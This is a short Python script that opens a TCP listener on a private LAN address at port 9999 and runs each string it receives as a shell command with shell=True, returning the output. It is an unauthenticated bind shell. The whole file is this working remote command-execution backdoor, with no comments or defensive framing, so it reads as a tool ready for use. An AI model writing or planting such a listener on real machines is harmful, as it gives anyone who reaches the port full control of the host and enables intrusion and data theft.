import socket
import subprocess

HOST = '192.168.0.103'
PORT = 9999


def receivedSender(c):
        received = c.recv(1024)
        process = subprocess.check_output(received.decode( 'utf-8'), shell=True, universal_newlines=True)
        c.sendall(process.encode('utf-8'))
TCP_SERVER = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
TCP_SERVER.bind( (HOST, PORT))

TCP_SERVER.listen(1)

print("Listening...")

c, addr = TCP_SERVER.accept()

print("Connection {}:{}".format(addr[0], addr[1]))

while True:
        receivedSender(c)

#       c.close()
TCP_SERVER.close()

